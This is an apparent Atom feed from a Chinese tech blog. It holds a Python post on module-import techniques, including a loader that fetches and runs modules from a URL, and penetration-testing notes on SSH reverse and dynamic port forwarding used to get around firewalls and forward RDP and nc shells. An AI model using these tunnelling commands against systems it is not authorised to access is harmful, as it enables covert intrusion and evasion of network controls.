<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cat++</title>
  
  <subtitle>看见我的猫粮吗</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://c.cat.plus/"/>
  <updated>2020-05-14T15:12:54.169Z</updated>
  <id>http://c.cat.plus/</id>
  
  <author>
    <name>Cat</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python花式导包的几种方法</title>
    <link href="http://c.cat.plus/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://c.cat.plus/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
    <published>2018-03-14T17:01:00.000Z</published>
    <updated>2020-05-14T15:12:54.169Z</updated>
    
    <content type="html"><![CDATA[<p>今天跟大家分享 8 种导入模块的方法。</p><p>直接 import<br>人尽皆知的方法，直接导入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>与此类似的还有，不再细讲</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br></pre></td></tr></table></figure><p>一般情况下，使用 import 语句导入模块已经够用的。</p><p>但是在一些特殊场景中，可能还需要其他的导入方式。</p><p>下面我会一一地给你介绍。</p><p>使用 <strong>import</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__ 函数可用于导入模块，<span class="keyword">import</span> 语句也会调用函数。其定义为：</span><br><span class="line"></span><br><span class="line">__import__(name[, globals[, locals[, fromlist[, level]]]])</span><br></pre></td></tr></table></figure><p>参数介绍：</p><p>name (required): 被加载 module 的名称</p><p>globals (optional): 包含全局变量的字典，该选项很少使用，采用默认值 global()</p><p>locals (optional): 包含局部变量的字典，内部标准实现未用到该变量，采用默认值 - local()</p><p>fromlist (Optional): 被导入的 submodule 名称</p><p>level (Optional): 导入路径选项，Python 2 中默认为 -1，表示同时支持 absolute import 和 relative import。Python 3 中默认为 0，表示仅支持 absolute import。如果大于 0，则表示相对导入的父目录的级数，即 1 类似于 ‘.’，2 类似于 ‘..’。</p><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy 的效果，只要修改左值即可</p><p>如下示例，等价于 import os as myos：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 importlib<br>importlib 是 Python 中的一个标准库，importlib 能提供的功能非常全面。</p><p>它的简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos=importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy效果，可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 imp<br>imp 模块提供了一些 import 语句内部实现的接口。例如模块查找（find_module）、模块加载（load_module）等等（模块的导入过程会包含模块查找、加载、缓存等步骤）。可以用该模块来简单实现内建的 <strong>import</strong> 函数功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file, pathname, desc = imp.find_module(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = imp.load_module(<span class="string">'sep'</span>, file, pathname, desc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos</span><br><span class="line">&lt;module <span class="string">'sep'</span> <span class="keyword">from</span> <span class="string">'/usr/lib64/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>从 python 3 开始，内建的 reload 函数被移到了 imp 模块中。而从 Python 3.4 开始，imp 模块被否决，不再建议使用，其包含的功能被移到了 importlib 模块下。即从 Python 3.4 开始，importlib 模块是之前 imp 模块和 importlib 模块的合集。</p><p>使用 execfile<br>在 Python 2 中有一个 execfile 函数，利用它可以用来执行一个文件。</p><p>语法如下：</p><p>execfile(filename[, globals[, locals]])</p><p>参数有这么几个：</p><p>filename：文件名。</p><p>globals：变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</p><p>locals：变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">"/usr/lib64/python2.7/os.py"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 exec<br>execfile 只能在 Python2 中使用，Python 3.x 里已经删除了这个函数。</p><p>但是原理值得借鉴，你可以使用 open … read  读取文件内容，然后再用 exec 去执行模块。</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">"/usr/lib64/python2.7/os.py"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span>    exec(f.read())</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>import_from_github_com<br>有一个包叫做 import_from_github_com，从名字上很容易得知，它是一个可以从 github 下载安装并导入的包。为了使用它，你需要做的就是按照如下命令使用pip 先安装它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install import_from_github_com</span><br></pre></td></tr></table></figure><p>这个包使用了PEP 302中新的引入钩子，允许你可以从github上引入包。这个包实际做的就是安装这个包并将它添加到本地。你需要 Python 3.2 或者更高的版本，并且 git 和 pip 都已经安装才能使用这个包。</p><p>pip 要保证是较新版本，如果不是请执行如下命令进行升级。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>确保环境 ok 后，你就可以在 Python shell 中使用 import_from_github_com</p><p>示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> github_com.zzzeek <span class="keyword">import</span> sqlalchemy</span><br><span class="line">Collecting git+https://github.com/zzzeek/sqlalchemy</span><br><span class="line">Cloning https://github.com/zzzeek/sqlalchemy to /tmp/pip-acfv7t06-build</span><br><span class="line">Installing collected packages: SQLAlchemy</span><br><span class="line">Running setup.py install <span class="keyword">for</span> SQLAlchemy ... done</span><br><span class="line">Successfully installed SQLAlchemy<span class="number">-1.1</span><span class="number">.0</span>b1.dev0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>locals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__spec__'</span>: <span class="literal">None</span>,</span><br><span class="line"><span class="string">'__package__'</span>: <span class="literal">None</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>,</span><br><span class="line"><span class="string">'sqlalchemy'</span>: &lt;module <span class="string">'sqlalchemy'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python3.5/site-packages/\</span></span><br><span class="line"><span class="string">sqlalchemy/__init__.py'</span>&gt;,</span><br><span class="line"><span class="string">'__loader__'</span>: &lt;<span class="class"><span class="keyword">class</span> '<span class="title">_frozen_importlib</span>.<span class="title">BuiltinImporter</span>'&gt;&#125;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>看了 import_from_github_com的源码后，你会注意到它并没有使用importlib。实际上，它的原理就是使用 pip 来安装那些没有安装的包，然后使用Python的<strong>import</strong>()函数来引入新安装的模块。</p><p>远程导入模块<br>我在这篇文章里（深入探讨 Python 的 import 机制：实现远程导入模块），深入剖析了导入模块的内部原理，并在最后手动实现了从远程服务器上读取模块内容，并在本地成功将模块导入的导入器。</p><p>具体内容非常的多，你可以点击这个链接进行深入学习。</p><p>示例代码如下：</p><h1 id="新建一个-py-文件（my-importer-py），内容如下"><a href="#新建一个-py-文件（my-importer-py），内容如下" class="headerlink" title="新建一个 py 文件（my_importer.py），内容如下"></a>新建一个 py 文件（my_importer.py），内容如下</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> urllib2</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaFinder</span><span class="params">(importlib.abc.MetaPathFinder)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self._baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_module</span><span class="params">(self, fullname, path=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            baseurl = self._baseurl</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不是原定义的url就直接返回不存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path.startswith(self._baseurl):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            baseurl = path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            loader = UrlMetaLoader(baseurl)</span><br><span class="line">            <span class="keyword">return</span> loader</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaLoader</span><span class="params">(importlib.abc.SourceLoader)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self.baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        f = urllib2.urlopen(self.get_filename(fullname))</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_filename</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.baseurl + fullname + <span class="string">'.py'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install_meta</span><span class="params">(address)</span>:</span></span><br><span class="line">    finder = UrlMetaFinder(address)</span><br><span class="line">    sys.meta_path.append(finder)</span><br></pre></td></tr></table></figure><p>并且在远程服务器上开启 http 服务（为了方便，我仅在本地进行演示），并且手动编辑一个名为 my_info 的 python 文件，如果后面导入成功会打印 ok。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir httpserver &amp;&amp; cd httpserver</span><br><span class="line">$ cat&gt;my_info.py&lt;EOF</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">EOF</span><br><span class="line">$ cat my_info.py</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">$</span><br><span class="line">$ python3 -m http.server <span class="number">12800</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">12800</span> (http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">12800</span>/) ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>一切准备好，验证开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> my_importer <span class="keyword">import</span> install_meta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>install_meta(<span class="string">'http://localhost:12800/'</span>) <span class="comment"># 往 sys.meta_path 注册 finder</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> my_info  <span class="comment"># 打印ok，说明导入成功</span></span><br><span class="line">ok</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_info.name  <span class="comment"># 验证可以取得到变量</span></span><br><span class="line"><span class="string">'wangbm'</span></span><br></pre></td></tr></table></figure><p>好了，8 种方法都给大家介绍完毕，对于普通开发者来说，其实只要掌握 import 这种方法足够了，而对于那些想要自己开发框架的人来说，深入学习 <strong>import</strong> 以及 importlib 是非常有必要的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天跟大家分享 8 种导入模块的方法。&lt;/p&gt;
&lt;p&gt;直接 import&lt;br&gt;人尽皆知的方法，直接导入即可&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="python" scheme="http://c.cat.plus/categories/python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SSH远程端口转发和动态端口转发以及X协议转发</title>
    <link href="http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A5%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/"/>
    <id>http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A5%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/</id>
    <published>2015-07-03T11:26:37.000Z</published>
    <updated>2020-05-27T08:43:02.346Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a><strong>SSH远程端口转发</strong></h3><p>由于ACL等原因,SSH与应用连接建立方向相反</p></blockquote><h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a><strong>本地端口转发</strong></h4><ul><li>SSH客户端+应用客户端位于FW一端</li><li>SSH服务端+应用服务端位于另一端<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a><strong>远程端口转发</strong></h4></li><li>SSH客户端,应用客户端位于FW两端</li><li>SSH服务端,应用服务端位于FW两端<pre><code>ssh -fNg -R &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;SSH server&gt; -p &lt;ssh server port&gt;ssh -CfNg -R 7001:1.1.1.11:80 root@192.168.254.118 -p 53        #WEB应用端口转发ssh -CfNg -R 7002:1.1.1.11:3389 root@192.168.254.118 -p 53        #RDP应用端口转发ssh -CfNg -R 7003:1.1.1.11:3333 root@192.168.254.118 -p 53        #NC应用端口转发</code></pre></li><li>之所以称为远程,是因为SSH侦听端口开在远程的SSH Server上</li><li>侦听端口永远开在应用客户端一方</li><li>WEB,RDP,NC应用端口转发测试</li></ul><p><em><code>A &lt;-&gt; C 以及 B &lt;-&gt; D 之间通信未加密,可嗅探</code></em><br>![ssh远程端口转发](<a href="https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/shhreverse.jpg" target="_blank" rel="noopener">https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/shhreverse.jpg</a> 400x300)</p><blockquote><h3 id="SSH-动态端口转发"><a href="#SSH-动态端口转发" class="headerlink" title="SSH 动态端口转发"></a><strong>SSH 动态端口转发</strong></h3></blockquote><h4 id="本地-远程端口转发都需要固定应用服务器IP-Port"><a href="#本地-远程端口转发都需要固定应用服务器IP-Port" class="headerlink" title="本地,远程端口转发都需要固定应用服务器IP,Port"></a>本地,远程端口转发都需要固定应用服务器IP,Port</h4><ul><li>应用端口繁多,逐个转发效率低</li><li>某些应用不固定端口</li><li>某些网站不支持IP直接访问</li><li>使用非受信网络上网时保护流量不被嗅探<h4 id="本地侦听socks4-5代理端口"><a href="#本地侦听socks4-5代理端口" class="headerlink" title="本地侦听socks4/5代理端口"></a>本地侦听socks4/5代理端口</h4></li><li>由SSH server决定如何转发</li><li>作为翻墙代理使用</li><li>配置客户端代理(浏览器)</li><li>使用 <strong>proxychains</strong> 支持无代理客户端<br><code>ssh -CfNg -D 7001 root@1.1.1.1 -p 2121</code></li></ul><blockquote><h3 id="X-协议转发"><a href="#X-协议转发" class="headerlink" title="X 协议转发"></a><strong>X 协议转发</strong></h3></blockquote><ul><li>远程登录Linux GUI运行图形化界面工具<br>  VNC<br>  X Windows</li><li>防火墙限制访问时<br>  基于SSH的X转发<br>  <code>ssh -X user@1.1.1.1 -p 53</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;SSH远程端口转发&quot;&gt;&lt;a href=&quot;#SSH远程端口转发&quot; class=&quot;headerlink&quot; title=&quot;SSH远程端口转发&quot;&gt;&lt;/a&gt;&lt;strong&gt;SSH远程端口转发&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;由于ACL等原因,SSH
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="VNC" scheme="http://c.cat.plus/tags/VNC/"/>
    
      <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
    
      <category term="proxychains" scheme="http://c.cat.plus/tags/proxychains/"/>
    
  </entry>
  
  <entry>
    <title>SSH隧道和SSH本地端口转发</title>
    <link href="http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E9%9A%A7%E9%81%93%E5%92%8CSSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E9%9A%A7%E9%81%93%E5%92%8CSSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
    <published>2015-07-02T19:23:17.000Z</published>
    <updated>2020-05-27T02:31:43.446Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a><strong>SSH 隧道</strong></h3></blockquote><h4 id="SSH支持双向通信隧道技术"><a href="#SSH支持双向通信隧道技术" class="headerlink" title="SSH支持双向通信隧道技术"></a><strong>SSH支持双向通信隧道技术</strong></h4><ul><li>将其它TCP端口的通信通过SSH链接来转发</li><li>用SSH作为传输层协议,对流量自动加解密</li><li>突破防火墙访问规则的限制,可用于翻墙<h4 id="SSH-本地端口转发"><a href="#SSH-本地端口转发" class="headerlink" title="SSH 本地端口转发"></a><strong>SSH 本地端口转发</strong></h4></li><li>使效果类似于Rinetd</li><li>将一本地端口与远程服务器建立隧道<h4 id="建立双向安全隧道"><a href="#建立双向安全隧道" class="headerlink" title="建立双向安全隧道"></a><strong>建立双向安全隧道</strong></h4></li><li>将其它TCP端口的通信通过SSH链接来转发</li><li>用SSH作为传输层协议,对流量自动加解密</li><li>突破防火墙访问规则的限制,可用于翻墙<h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a><strong>本地端口转发</strong></h4></li><li>本机侦听端口,访问转发到远程主机指定端口<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a><strong>远程端口转发</strong></h4></li><li>远程侦听端口,访问转发到本机主机指定端口<h4 id="动态隧道模式"><a href="#动态隧道模式" class="headerlink" title="动态隧道模式"></a><strong>动态隧道模式</strong></h4></li><li>动态端口转发</li></ul><blockquote><h4 id="将本地端口与远程服务器建立隧道"><a href="#将本地端口与远程服务器建立隧道" class="headerlink" title="将本地端口与远程服务器建立隧道"></a><strong>将本地端口与远程服务器建立隧道</strong></h4></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Kali默认不允许Root登录,修改以下配置</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PermitRootLogin prohibit-password#注释此项</span><br><span class="line">PermitRootLogin yes#add此项</span><br><span class="line">Port 53#更改默认端口</span><br><span class="line">PasswordAuthentication yes#取消注释此项</span><br><span class="line"></span><br><span class="line">service ssh start#Kali默认不启动SSH服务,启动SSH</span><br><span class="line">service ssh restart#修改配置后重启SSH服务</span><br><span class="line"></span><br><span class="line">本地端口转发:</span><br><span class="line">ssh -fCNg -L &lt;local listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt; #本地端口转发侦听</span><br><span class="line">ssh -L 7001:192.168.1.124:80 root@192.168.1.110 -p 53</span><br><span class="line"></span><br><span class="line">ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt; </span><br><span class="line"></span><br><span class="line">-f#后台运行进程</span><br><span class="line">-N#不执行登录shell</span><br><span class="line">-g#复用访问时作为网关,支持多主机访问本地侦听端口</span><br></pre></td></tr></table></figure><ul><li>网关模式转发RDP,NC shell</li><li>端口转发基于建立起来的SSH隧道,隧道中断则端口转发中断</li><li>只能在建立隧道时创建转发,不能为已有隧道增加端口转发</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;SSH-隧道&quot;&gt;&lt;a href=&quot;#SSH-隧道&quot; class=&quot;headerlink&quot; title=&quot;SSH 隧道&quot;&gt;&lt;/a&gt;&lt;strong&gt;SSH 隧道&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;SSH支持
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
    
      <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
    
      <category term="shell" scheme="http://c.cat.plus/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>流量操控技术之重定向</title>
    <link href="http://c.cat.plus/2015/07/01/Traffic_manipulation/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <id>http://c.cat.plus/2015/07/01/Traffic_manipulation/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</id>
    <published>2015-07-01T08:13:37.000Z</published>
    <updated>2020-05-27T02:21:55.522Z</updated>
    
